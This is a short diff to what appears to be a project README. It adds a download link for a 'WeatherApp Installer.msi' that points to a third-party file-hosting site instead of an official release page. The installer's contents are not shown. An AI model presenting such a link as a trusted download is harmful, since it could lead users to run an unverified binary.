@@ -6,6 +6,6 @@
 
 # Downloads
 
-[Latest Release (.msi)]()
+[Latest Release (.msi)](https://server7.dosya.co/cgi-bin/azcl9.cgi/u4lkftvn73gvcmxrbs2eyvzuhwbrlg3wimd7abthxa/WeatherApp%20Installer.msi)
 
 [Latest Release (.exe)]()
